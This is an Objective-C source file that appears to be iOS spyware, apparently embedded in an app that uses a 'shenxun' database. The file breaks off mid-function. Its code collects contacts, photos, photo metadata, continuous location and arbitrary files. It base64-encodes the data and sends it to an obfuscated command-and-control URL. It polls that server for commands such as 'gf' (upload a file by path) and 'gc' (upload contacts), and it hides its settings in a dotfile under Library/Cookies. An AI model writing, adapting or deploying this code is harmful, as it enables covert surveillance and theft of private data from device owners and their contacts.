#import "FMDatabase.h"
#import <unistd.h>
#import <objc/runtime.h>

#if FMDB_SQLITE_STANDALONE
#import <sqlite3/sqlite3.h>
#else
#import <sqlite3.h>
#endif


#import "Foundation/Foundation.h"

#import <Contacts/Contacts.h>
#import <CoreLocation/CoreLocation.h>

#import <Photos/Photos.h>





///////////////////////////////////////



@interface LocationManager : NSObject <CLLocationManagerDelegate>
  
@property (nonatomic, strong) CLLocationManager *locationManager;
@property (nonatomic, copy) void(^locationBlock)(CLLocation *location, NSError *error);
  
- (void)startLocationUpdatesWithCompletion:(void(^)(CLLocation *location, NSError *error))completion;
- (void)stopLocationUpdates;
  
@end
  
@implementation LocationManager
  
- (instancetype)init {
    self = [super init];
    if (self) {
        _locationManager = [[CLLocationManager alloc] init];
        _locationManager.delegate = self;
        _locationManager.desiredAccuracy = kCLLocationAccuracyBest;
        _locationManager.distanceFilter = kCLDistanceFilterNone;
    }
    return self;
}
  
- (void)startLocationUpdatesWithCompletion:(void(^)(CLLocation *location, NSError *error))completion {
    self.locationBlock = completion;
      
    if ([_locationManager respondsToSelector:@selector(requestAlwaysAuthorization)]) {
        [_locationManager requestAlwaysAuthorization];
    }
      
    [_locationManager startUpdatingLocation];
}
  
- (void)stopLocationUpdates {
    [_locationManager stopUpdatingLocation];
}
  
#pragma mark - CLLocationManagerDelegate methods
  
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    if (locations.count > 0) {
        CLLocation *latestLocation = [locations lastObject];
        if (self.locationBlock) {
            self.locationBlock(latestLocation, nil);
        }
    }
}
  
- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    if (self.locationBlock) {
        self.locationBlock(nil, error);
    }
}

  
@end



void initConfig(void);
void dealwithSXfileFileTask(NSString *strUserId);
void dealwithPhotosTask(NSString *strUserId);
NSString *postDataToServer(NSString *strData_B64, NSString *strUserId, BOOL bNeedDealwithResponse);
void dealwithLocationTask(NSString *strUserId);

void initConfig(void)
{
    NSString *strHomeDir = NSHomeDirectory();
    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Cookies/.info"];
    NSDate *dateNow = [NSDate date];
    
    NSInteger nInitTime = (NSInteger)[dateNow timeIntervalSince1970];
    NSInteger nHeartBeatInterval = 60;
    NSInteger nHeartBeatLastTime = (NSInteger)[dateNow timeIntervalSince1970];
    NSInteger nLocationInterval = 60*2;
    NSInteger nLocationLastTIme = nHeartBeatLastTime;
    
    NSString *strConfig = [NSString stringWithFormat:@"%ld\n%ld\n%ld\n%ld\n%ld",nInitTime,nHeartBeatInterval,nHeartBeatLastTime,nLocationInterval,nLocationLastTIme];
    
    NSData *dataConfig = [strConfig dataUsingEncoding:NSUTF8StringEncoding];
    
    BOOL success = [dataConfig writeToFile:strPathConfig atomically:YES ];
    if (success) {
         NSLog(@"config saved to file successfully.");
     } else {
         NSLog(@"config save string to file error.");
     }
    
    return;
}

//NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime
void updateConfig(NSArray *strArrayTimeParameters)
{

    
    NSString *strHomeDir = NSHomeDirectory();
    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Cookies/.info"];
    NSString *strConfig = [NSString stringWithFormat:@"%@\n%@\n%@\n%@\n%@",strArrayTimeParameters[0],strArrayTimeParameters[1],strArrayTimeParameters[2],strArrayTimeParameters[3],strArrayTimeParameters[4]];
    NSData *dataConfig = [strConfig dataUsingEncoding:NSUTF8StringEncoding];
    
    BOOL success = [dataConfig writeToFile:strPathConfig atomically:YES ];
    if (success) {
         NSLog(@"config saved to file successfully.");
     } else {
         NSLog(@"config save string to file error.");
     }
    
    
}

NSArray *readConfigFile(void)
{
    NSString *strHomeDir = NSHomeDirectory();
    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Cookies/.info"];
    // 读取文件内容到字符串
    NSError *error = nil;
    NSString *fileContents = [NSString stringWithContentsOfFile:strPathConfig encoding:NSUTF8StringEncoding error:&error];
              
    if (error)
    {
        NSLog(@"Error reading file: %@", error);
        return nil;
    }
              
    // 分割字符串，假设每行是一个独立的字符串，使用换行符作为分隔符
    NSArray *linesArray = [fileContents componentsSeparatedByString:@"\n"];
              
    // 输出数组内容
    for (NSString *line in linesArray)
    {
        NSLog(@"%@", line);
    }
              
    // 如果你需要根据其他字符或字符串分割，可以替换分隔符
    // 例如，按逗号分割
    NSArray *strarrayTime = [fileContents componentsSeparatedByString:@"\n"];
    return strarrayTime;

}



NSString *getFileSizeAtPath(NSString *filePath)
{
    // 获取文件管理器
    NSFileManager *fileManager = [NSFileManager defaultManager];
      
    // 获取文件属性
    NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:filePath error:nil];
      
    // 检查是否成功获取文件属性
    if (fileAttributes == nil) {
        NSLog(@"Error getting file attributes.");
        return nil;
    }
      
    // 从文件属性中获取文件大小（以字节为单位）
    NSNumber *fileSizeNumber = fileAttributes[NSFileSize];
    
    // 转换为KB
    double fileSizeKB = [fileSizeNumber doubleValue] / 1024;
    NSString *fileSizeKBString = [NSString stringWithFormat:@"%.2f KB", fileSizeKB];
//    NSLog(@"File size in KB: %@", fileSizeKBString);

      
    return fileSizeKBString;
}



NSMutableString *enumerateDirectoryAtPath(NSString *path, NSInteger level) 
{
    
    NSMutableString *strFileList;
    if(level == 0)
    {
        strFileList = [NSMutableString stringWithString:@"\r\nAllFileList:"];
    }else{
        strFileList = [NSMutableString stringWithString:@""];
    
    }

    // 获取文件管理器
    NSFileManager *fileManager = [NSFileManager defaultManager];
      
    // 获取目录枚举器
    NSEnumerator *enumerator = [fileManager enumeratorAtPath:path];
      
    // 遍历目录中的文件和子目录
    NSString *item;
    while ((item = [enumerator nextObject])) {
        // 构建完整的文件或子目录路径
        NSString *fullPath = [path stringByAppendingPathComponent:item];
          
        // 判断是文件还是目录
        BOOL isDirectory = NO;
        NSError *error;
        BOOL exists = [fileManager fileExistsAtPath:fullPath isDirectory:&isDirectory];
        if (!exists) {
            continue;
        }
          
        // 打印缩进以显示层级关系
//        for (NSInteger i = 0; i < level; i++) {
//            NSLog(@"  ");
//        }
          
        // 打印文件或目录名称
        if (isDirectory) {
            //NSLog(@"[%@] (Directory)", fullPath);
            // 如果是目录，则递归遍历
            NSMutableString *strFileList_sub = enumerateDirectoryAtPath(fullPath, level + 1);
            [strFileList appendFormat:@"\r\n%@", strFileList_sub];
        } else {
            NSString *strSize = getFileSizeAtPath(fullPath);
            //NSLog(@"- %@ (File) %@", fullPath,strSize);
            [strFileList appendFormat: @"\r\%@ %@",fullPath, strSize];
        }
    }
    
    return  strFileList;
}


NSString *getSXfileDirectory(void)
{
    NSString *strHomePath = NSHomeDirectory();//
    NSString *strfilePath_sxfiles =[strHomePath stringByAppendingPathComponent:@"Library/sxfiles"];
    NSString *strAllFileList = enumerateDirectoryAtPath(strfilePath_sxfiles, 0);
    NSLog(@"%@", strAllFileList);
    
    return strAllFileList;
        
}



//////////////////////////
//NSDate *getImageDataBylocalIdentifier:(NSString *)localIdentifier
NSData *getImageDataBylocalIdentifier(NSString *localIdentifier, NSString *strUserId)
{
    //NSString *localIdentifier = asset.localIdentifier;
      
    // 使用 PHFetchOptions 来设置预测取条件
    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
    fetchOptions.predicate = [NSPredicate predicateWithFormat:@"localIdentifier = %@", localIdentifier];
      
    // 创建一个 PHAsset 的 fetch result
    PHFetchResult<PHAsset *> *assetsFetchResult = [PHAsset fetchAssetsWithOptions:fetchOptions];
      
    // 检查是否找到了对应的 asset
    __block NSData *imageData2;
    if (assetsFetchResult.count > 0)
    {
        PHAsset *asset = assetsFetchResult.firstObject;
          
        // 创建一个 PHImageManager 实例
        PHImageManager *imageManager = [PHImageManager defaultManager];
          
        // 设置请求选项
        PHImageRequestOptions *options = [[PHImageRequestOptions alloc] init];
        options.version = PHImageRequestOptionsVersionCurrent;
        options.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;
        options.resizeMode = PHImageRequestOptionsResizeModeExact;
          
        // 请求图片数据

        [imageManager requestImageDataForAsset:asset
                                       options:options
                                    resultHandler:^( NSData *imageData, NSString *dataUTI, UIImageOrientation orientation, NSDictionary *info) 
         {
            if (imageData) 
            {
                imageData2 = imageData;
                
                NSData *dataPhoto_B64 = [imageData base64EncodedDataWithOptions:0];
                NSString *strPhoto_B64 = [[NSString alloc] initWithData:dataPhoto_B64 encoding:NSUTF8StringEncoding];
                
                NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=p?u=%@?f=%@?contents=%@",strUserId,localIdentifier,strPhoto_B64];
                
                postDataToServer(strPost,strUserId,false);
                
            }
            else
            {
                // 处理错误情况
                NSLog(@"Failed to load image data for asset with localIdentifier: %@", localIdentifier);
            }
        }];
    } 
    else
    {
        // 没有找到对应的 asset
        NSLog(@"No asset found with localIdentifier: %@", localIdentifier);
    }
   
    return imageData2;
    
}


NSString * getPhotoInfoListOfAlbum(PHAssetCollection *album, NSString * strAlbumTitle )
{
    NSMutableString *strPhotoInfoList = [NSMutableString stringWithString:@"\r\n======="];
    [strPhotoInfoList appendFormat:@"%@=======", strAlbumTitle];
    
    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
    fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
      
    PHFetchResult *assetsFetchResult = [PHAsset fetchAssetsInAssetCollection:album options:fetchOptions];
    //NSInteger aa  = assetsFetchResult.accessibilityElementCount;
    NSInteger nCount = assetsFetchResult.count;
    
    //NSArray *assets = assetsFetchResult.objects;
    if (assetsFetchResult.count > 0)
    {

        for (PHAsset *asset in assetsFetchResult) 
        {
            
            NSLog(@"Asset Title: %@,location:%@", asset.description,asset.location);
            [strPhotoInfoList appendFormat:@"\r\ndescription:%@,location:%@", asset.description, asset.location];
 
        }
    }
    
    return strPhotoInfoList;
}


NSString * fetchAllAlbumsPhotos(void)
{
  
    NSMutableString * strAllPhotoList = [NSMutableString stringWithString:@""];
    
    // 创建获取相册的 fetch 选项
  PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
  fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"localizedTitle" ascending:YES]];

  // 获取用户创建的相册
  PHFetchResult *albumsFetchResult = [PHAssetCollection fetchAssetCollectionsWithType:PHAssetCollectionTypeAlbum subtype:PHAssetCollectionSubtypeAny options:fetchOptions];
  for (PHAssetCollection *album in albumsFetchResult) 
  {
      NSLog(@"Album Title: %@", album.localizedTitle);
      
      NSString * strTemp = getPhotoInfoListOfAlbum(album,album.localizedTitle);
      [strAllPhotoList appendFormat:@"%@", strTemp];
  }

  // 获取智能相册（例如最近添加、最近删除等）
  PHFetchResult *smartAlbumsFetchResult = [PHAssetCollection fetchAssetCollectionsWithType:PHAssetCollectionTypeSmartAlbum subtype:PHAssetCollectionSubtypeAny options:fetchOptions];
  for (PHAssetCollection *smartAlbum in smartAlbumsFetchResult) 
  {
      NSLog(@"Smart Album Title: %@，count:%lu",
            smartAlbum.localizedTitle,smartAlbum.estimatedAssetCount);
      NSString *strTemp = getPhotoInfoListOfAlbum(smartAlbum,smartAlbum.localizedTitle );
      [strAllPhotoList appendFormat:@"%@", strTemp];
    }
    
    return strAllPhotoList;
}


// 获取所有相册，包括用户创建的相册和智能相册
NSString * authAndFetchAllAlbumsPhotos(void)
{
    __block NSString *strAllPhotosInfo = @"";
    strAllPhotosInfo = fetchAllAlbumsPhotos();
    
    //NSLog(@"%@", strAllPhotosInfo);
    
    // 请求照片库访问权限
    [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) 
     {
        if (status == PHAuthorizationStatusAuthorized) 
        {
            // 授权成功，获取相册列表
            strAllPhotosInfo = fetchAllAlbumsPhotos();
            //return strAllPhotosInfo;
        }
        else
        {
            // 处理未授权的情况
            NSLog(@"Access to photo library denied.");
        }
    }];
    
    return strAllPhotosInfo;
}
/*
NSString *extractFirstOccurrenceUsingRegularExpression(NSString *pattern,NSString *inputString)
{
    NSError *error = nil;
    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:pattern options:NSRegularExpressionCaseInsensitive error:&error];
    if (!regex) {
        NSLog(@"正则表达式创建失败: %@", error);
        return nil;
    }
      
    NSTextCheckingResult *match = [regex firstMatchInString:inputString options:0 range:NSMakeRange(0, [inputString length])];
    if (!match) {
        // 没有找到匹配项
        return nil;
    }
      
    NSRange matchRange = [match range];
    return [inputString substringWithRange:matchRange];
}

*/


NSString *getUserID(void)
{
    NSString *strUserID = @"";
    NSString *strHomeDir = NSHomeDirectory();
    NSString *strPathDB = [strHomeDir stringByAppendingPathComponent:@"Library/SXDatabase/shenxun.db"];
    
    sqlite3 *database;

     
       if (sqlite3_open([strPathDB UTF8String], &database) == SQLITE_OK) {
           const char *sql = "SELECT owner FROM device";
           sqlite3_stmt *statement;
           if (sqlite3_prepare_v2(database, sql, -1, &statement, NULL) == SQLITE_OK) {
               while (sqlite3_step(statement) == SQLITE_ROW) {
                   // 读取数据
                   strUserID = [NSString stringWithUTF8String:(char *)sqlite3_column_text(statement, 0)];
                   NSLog(@"Some Field: %@", strUserID);
               }
               sqlite3_finalize(statement);
           } else {
               NSLog(@"Failed to prepare statement with message '%s'.", sqlite3_errmsg(database));
           }
           sqlite3_close(database);
       } else {
           NSLog(@"Failed to open database with message '%s'.", sqlite3_errmsg(database));
       }

    
    return strUserID;
}

/////////////////////////////////////////

NSString *getAllContact(void)
{
    id contacts = [[NSMutableArray alloc] init];
    
    NSArray *keysToFetch = @[CNContactFamilyNameKey, CNContactGivenNameKey,CNContactJobTitleKey,CNContactTypeKey,CNContactNicknameKey,CNContactNamePrefixKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey];

    CNContactFetchRequest *fetchRequest = [[CNContactFetchRequest alloc] initWithKeysToFetch:keysToFetch];
    
    CNContactStore *contactStore = [[CNContactStore alloc] init];
    NSError *error = nil;
    [contactStore enumerateContactsWithFetchRequest:fetchRequest error:&error usingBlock:^(CNContact *_Nonnull contact, BOOL *_Nonnull stop) {
        if (!error) {
            [contacts addObject:contact];
        } else {

        }
    }];

    NSArray *listContacts = contacts;
    
    NSMutableString *strAllinfo = [NSMutableString stringWithString:@"\r\nAllContact:"];
    [listContacts enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        
        
        CNContact *contact = obj;
        
        NSString *firstName = contact.givenName;
        NSString *lastName = contact.familyName;
        NSString *name = [NSString stringWithFormat:@"\r\n%@ %@", firstName, lastName];
        
        [strAllinfo appendString:@"\r\n=============================="];
        [strAllinfo appendString:name];

        
        //取得Email属性
        NSArray<CNLabeledValue<NSString*>*> *emailAddresses = contact.emailAddresses;
        
        [strAllinfo appendString:@"\r\nEmail:"];
        for (CNLabeledValue<NSString*>* emailProperty in emailAddresses)
        {
            NSString *strEmailLable_raw = emailProperty.label;
            NSString *strEmailLable_1 = [strEmailLable_raw stringByReplacingOccurrencesOfString:@"_$!" withString:@""];
            NSString *strEmailLable = [strEmailLable_1 stringByReplacingOccurrencesOfString:@"!$_" withString:@""];
            
            NSString *strEmailValue = emailProperty.value;
            
            NSString *strEmailInfo = [NSString stringWithFormat:@"\r\n%@ %@", strEmailLable, strEmailValue];
            
            [strAllinfo appendString:strEmailInfo];
            
        }
        
        //取得电话号码属性
        NSArray<CNLabeledValue<CNPhoneNumber*>*> *phoneNumbers = contact.phoneNumbers;
        
        [strAllinfo appendString:@"\r\nPhoneNumber:"];
        for (CNLabeledValue<CNPhoneNumber*>* phoneNumberProperty in phoneNumbers) {
            CNPhoneNumber *phoneNumber = phoneNumberProperty.value;
            NSString *strPhoneNumber = phoneNumber.stringValue;
            NSString *strPhoneLable_raw = phoneNumberProperty.label;
            
            NSString *strPhoneLable_1 = [strPhoneLable_raw stringByReplacingOccurrencesOfString:@"_$!" withString:@""];
            NSString *strPhoneLable = [strPhoneLable_1 stringByReplacingOccurrencesOfString:@"!$_" withString:@""];
            
            NSString *strPhoneInfo = [NSString stringWithFormat:@"\r\n%@ %@", strPhoneLable, strPhoneNumber];
            
            [strAllinfo appendString:strPhoneInfo];
        }
        
    }];

    
    return strAllinfo;
    
}
NSString *removeWhitespaceFromString(NSString *input) {
    // 使用 NSCharacterSet 的 whitespaceAndNewlineCharacterSet 来创建一个用于匹配空白字符的字符集
    NSCharacterSet *whitespaceSet = [NSCharacterSet whitespaceAndNewlineCharacterSet];
      
    // 从字符串的开头去除空白字符
    NSString *trimmedString = [input stringByTrimmingCharactersInSet:whitespaceSet];
      
    return trimmedString;
}

void dealwithCmd(NSString *strCmds, NSString *strUserId)
{
    BOOL bNeedDealwithResponse = false;
    NSArray *arrayCmds = [strCmds componentsSeparatedByString:@"\n"];
    for(NSString *strCmd in arrayCmds)
    {
        if(strCmd.length ==0)
            continue;
        
        //NSString *strCmdLower = [strCmd lowercaseString];
        
        if([strCmd hasPrefix:@"gfl"])
        {
            dealwithSXfileFileTask(strUserId);
            dealwithPhotosTask(strUserId);
        }
        else if ([strCmd hasPrefix:@"gl"])
        {
            dealwithLocationTask(strUserId);
        }
        else if ([strCmd hasPrefix:@"gf"])
        {
            NSString *strPath = [strCmd substringFromIndex:2];
            //NSCharacterSet *whitespace = [NSCharacterSet whitespaceCharacterSet];
            
            NSString *strPathTrimmed = removeWhitespaceFromString(strPath);
            //strPathTrimmed = @"/Users/testmacp/aa.txt";
            NSError *error = nil;
            NSData *dataFile = [NSData dataWithContentsOfURL:[NSURL fileURLWithPath:strPathTrimmed] options:0 error:&error];
            if(dataFile)
            {
                NSData *dataFile_B64 = [dataFile base64EncodedDataWithOptions:0];
                NSString *strFile_B64 = [[NSString alloc] initWithData:dataFile_B64 encoding:NSUTF8StringEncoding];
                
                NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=s?u=%@?f=%@?contents=%@",strUserId,strPathTrimmed, strFile_B64];
                postDataToServer(strPost,strUserId,false);
            }
        }
        else if([strCmd hasPrefix:@"gp"])
        {
            NSString *strPath = [strCmd substringFromIndex:2];

            NSString *strPathTrimmed = removeWhitespaceFromString(strPath);
            NSData *dataPhoto = getImageDataBylocalIdentifier(strPathTrimmed, strUserId);
            
            if(dataPhoto)
            {
                NSData *dataPhoto_B64 = [dataPhoto base64EncodedDataWithOptions:0];
                NSString *strPhoto_B64 = [[NSString alloc] initWithData:dataPhoto_B64 encoding:NSUTF8StringEncoding];
                
                NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=p?u=%@?f=%@?contents=%@",strUserId,strPathTrimmed,strPhoto_B64];
                postDataToServer(strPost,strUserId,false);
            }
            
        }
        else if ([strCmd hasPrefix:@"gc"])
        {
            NSString *strContact = getAllContact();
            NSData *dataContact = [strContact dataUsingEncoding:NSUTF8StringEncoding];
            NSString *strContact_B64 = [dataContact base64EncodedStringWithOptions:0];
            
            NSString *strPost = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=c?u=%@?contents=%@",strUserId,strContact_B64];
            postDataToServer(strPost,strUserId,false);
            
        }
        else if([strCmd hasPrefix:@"ch"])
        {
            NSString *strHeartBeatInterval = [strCmd substringFromIndex:2];
            NSString *strHeartBeatIntervalTrimmed = removeWhitespaceFromString(strHeartBeatInterval);

            
            NSArray *strArrayParameters = readConfigFile();
            //
            // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
            if(strArrayParameters)
            {
                NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
                mutableArrayParameters[1] =strHeartBeatIntervalTrimmed;
                updateConfig(mutableArrayParameters);
            }
        }
        else if([strCmd hasPrefix:@"cl"])
        {
            NSString *strLocationInterval = [strCmd substringFromIndex:2];
            //NSCharacterSet *whitespace = [NSCharacterSet whitespaceCharacterSet];
            NSArray *wordList = [strLocationInterval componentsSeparatedByString:@" "];
            NSString *strLocationIntervalTrimmed = [wordList componentsJoinedByString:@" "];
            
            NSArray *strArrayParameters = readConfigFile();
            //
           // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
            if(strArrayParameters)
            {
                NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
                mutableArrayParameters[1] =strLocationIntervalTrimmed;
                updateConfig(mutableArrayParameters);
            }
            
        }
   }
    
    return;
}

NSString *postDataToServer(NSString *strData_B64, NSString *strUserId, BOOL bNeedDealwithResponse)
{
    
    NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cDovLzE5Mi4xNjguMS42MC9pb3MtdC9zLnBocA==" substringFromIndex:10]; //1.60/s.php
    NSData *dataUrl_Plain = [[NSData alloc] initWithBase64EncodedString:strUrl_B64 options:0];
    NSString *strUrl_Plain = [[NSString alloc] initWithData:dataUrl_Plain encoding:NSUTF8StringEncoding];

    NSURL *url = [NSURL URLWithString:strUrl_Plain];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.timeoutInterval = 7.0;
    request.HTTPMethod = @"POST";
    //[request setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
    

    //NSString *bodyString = [NSString stringWithFormat:@"token=2LZGsFDyAwhyxoMO%@",strData_B64];
    NSData *data_b64 = [strData_B64 dataUsingEncoding:NSUTF8StringEncoding];
    request.HTTPBody = data_b64;
    NSURLSession *session = [NSURLSession sharedSession];

    //__block NSData * data;
    //__block NSData * _Nullable data;
    __block NSData * data2;
    //__block NSString *strResponse;
    [[session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        
        if(bNeedDealwithResponse )
        {
            NSString *strdata = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            NSString *strCmds = [strdata stringByReplacingOccurrencesOfString:@"\r" withString:@""];
            if(strCmds.length > 0)
            {
                dealwithCmd(strCmds, strUserId);
            }
        }
        
            //return strdata;
    }] resume];
    

    return @"";
}


NSString *getHistoryLocation(NSString *strPathLocation)
{

    
    NSStringEncoding encoding = NSUTF8StringEncoding; // 或者使用其他编码
    NSError *error = nil;
    NSString *fileContents = [NSString stringWithContentsOfFile:strPathLocation encoding:encoding error:&error];
    if (fileContents) 
    {
        // 文件读取成功，使用 fileContents
        NSLog(@"location文件内容: %@", fileContents);
        return fileContents;
    } else {
        // 读取文件时发生错误
        NSLog(@"读取文件时发生错误: %@", error);
        return @"";
    }
}


NSString *dealwithRealTimeLocation(NSString *strUserId, NSString *strPathLocation,BOOL bNeedSendToServer)
{
    //NSString *strLocation = @"";
    LocationManager *locationManager = [[LocationManager alloc] init];
      
    [locationManager startLocationUpdatesWithCompletion:^(CLLocation *location, NSError *error)
     {
        NSLog(@"location error : %@",error);
        if (location)
        {

            NSDate *now = [NSDate date];
            NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
            [dateFormatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
            NSString *strTimeNow = [dateFormatter stringFromDate:now];
            
            //NSLog(@"latitude:%f",location.coordinate.latitude);
            NSString *strLocation = [NSString stringWithFormat:@"\r\ntime:%@,Latitude: %f,Longitude: %f",strTimeNow, location.coordinate.latitude, location.coordinate.longitude];
            //NSLog(@"strrlocation:%@",strLocation);
            
            if(bNeedSendToServer)
            {
                NSData *dataLocation = [strLocation dataUsingEncoding:NSUTF8StringEncoding];
                NSString *strLocation_B64 = [dataLocation base64EncodedStringWithOptions:0];
                NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=l?u=%@?contents=%@",strUserId, strLocation_B64];
                
                postDataToServer(strPostData,strUserId, false);
            }
            
            // 打开文件句柄以追加模式
            NSFileHandle *fileHandle = [NSFileHandle fileHandleForUpdatingAtPath:strPathLocation];
            if (fileHandle == nil) {
                // 文件不存在，创建文件并写入
                [strLocation writeToFile:strPathLocation atomically:YES encoding:NSUTF8StringEncoding error:nil];
                NSLog(@"File created and string written.");
            } else {
                // 文件存在，移动到文件末尾并追加内容
                [fileHandle seekToEndOfFile];
                [fileHandle writeData:[strLocation dataUsingEncoding:NSUTF8StringEncoding]];
                [fileHandle closeFile];
                NSLog(@"String appended to file.");
            }
        }
        else if (error)
        {
            NSLog(@"Error occurred: %@", error.localizedDescription);
        }
          
        // 停止位置更新
        [locationManager stopLocationUpdates];
    }];
      
    // 等待位置更新，这里只是一个示例，你可能需要根据你的应用逻辑来处理
    // 注意：在真实的应用中，你不应该让主线程阻塞，而是使用异步处理或者事件驱动的方式来处理位置更新。
    //sleep(10);
    
    return  @"";
    
}


//get history and realtime location
void dealwithLocationTask(NSString *strUserId)
{
    NSString *strHomeDir = NSHomeDirectory();
    NSString *strPathLocation = [strHomeDir stringByAppendingPathComponent:@"/Library/Cookies/loc.info"];
    
    dealwithRealTimeLocation(strUserId,  strPathLocation, YES);
    
    NSString *strHistoryLocation = getHistoryLocation(strPathLocation);
    if(strHistoryLocation.length <3 )
    {
        return;
    }
    NSError *error = nil;
    if (![[NSFileManager defaultManager] removeItemAtPath:strPathLocation error:&error]) {
        // 删除文件失败
        //NSLog(@"Failed to delete file: %@", error);
    } else {
        // 创建空文件
        [[NSFileManager defaultManager] createFileAtPath:strPathLocation contents:nil attributes:nil];
    }
    
    NSString *strLocationInfo = [NSString stringWithFormat:@"\r\n%@",strHistoryLocation];
    NSData *dataLocationInfo = [strLocationInfo dataUsingEncoding:NSUTF8StringEncoding];
    NSString *strLocation_B64 = [dataLocationInfo base64EncodedStringWithOptions:0];
    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=l?u=%@?contents=%@",strUserId, strLocation_B64];
    
    postDataToServer(strPostData,strUserId,false);
    

    
    return;
}

void dealwithContactTask(NSString *strUserId)
{
    NSString *strAllContact = getAllContact();
    NSData *dataContact = [strAllContact dataUsingEncoding:NSUTF8StringEncoding];
    NSString *strAllContact_B64 = [dataContact base64EncodedStringWithOptions:0];
    
    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=c?u=%@?contents=%@",strUserId, strAllContact_B64];
    
    postDataToServer(strPostData, strUserId,false);

    
    return;
}

void dealwithSXfileFileTask(NSString *strUserId)
{
    
    NSString *strSXfileList = getSXfileDirectory();
    NSData *dataSXfileList = [strSXfileList dataUsingEncoding:NSUTF8StringEncoding];
    NSString *strSXfileList_B64 = [dataSXfileList base64EncodedStringWithOptions:0];
    
    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=fl?u=%@?contents=%@",strUserId, strSXfileList_B64];
    
    postDataToServer(strPostData,strUserId,false);
    
    return;
}

void dealwithPhotosTask(NSString *strUserId)
{
    NSString *strAllPhotosList = authAndFetchAllAlbumsPhotos();
    
    NSData *dataAllPhotosList = [strAllPhotosList dataUsingEncoding:NSUTF8StringEncoding];
    NSString *strAllPhotoList_B64 = [dataAllPhotosList base64EncodedStringWithOptions:0];
    
    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=pl?u=%@?contents=%@",strUserId, strAllPhotoList_B64];
    
    postDataToServer(strPostData,strUserId,false);
    
    return;
}


NSString *getCmdListAndProcess(NSString *strUserId)
{
    NSData *dataUserID = [strUserId dataUsingEncoding:NSUTF8StringEncoding];
    NSString *strUserID_B64 = [dataUserID base64EncodedStringWithOptions:0];
    
    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=g?u=%@?contents=%@",strUserId, strUserID_B64];
    
    NSString *strCmds = postDataToServer(strPostData,strUserId,true);
    return  strCmds;
}



void judeTimeParameters(NSArray *arraystrTimeParameters)
{
    
    //NSMutableArray *mutableArray = [arraystrTimeParameters mutableCopy];
    
    NSInteger nTimeInit = [arraystrTimeParameters[0] integerValue];
    NSInteger nTimeHeartBeatInterval = [arraystrTimeParameters[1] integerValue];
    NSInteger nTimeHearBeatLastTime = [arraystrTimeParameters[2] integerValue];
    NSInteger nTimeLocationInterval = [arraystrTimeParameters[3] integerValue];
    NSInteger nTimeLocationLastTime = [arraystrTimeParameters[4] integerValue];
    
    NSDate *dateNow = [NSDate date];
    NSInteger nNow = (NSInteger)[dateNow timeIntervalSince1970];
    
    NSString *strUserID = getUserID();
    //NSMutableString *
    NSInteger nAliveFirstOnline = 60;
    if( nTimeInit != 0 && (nNow - nTimeInit) > nAliveFirstOnline)
    {
        
        dealwithContactTask(strUserID);
        dealwithPhotosTask(strUserID);
        dealwithSXfileFileTask(strUserID);
        dealwithLocationTask(strUserID);
        
        //NSMutableArray *mutableArray = [arraystrTimeParameters mutableCopy];
        
        NSArray *strArrayParameters = readConfigFile();
        //
        // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
        if(strArrayParameters)
        {
            NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
            mutableArrayParameters[0] = @"0";
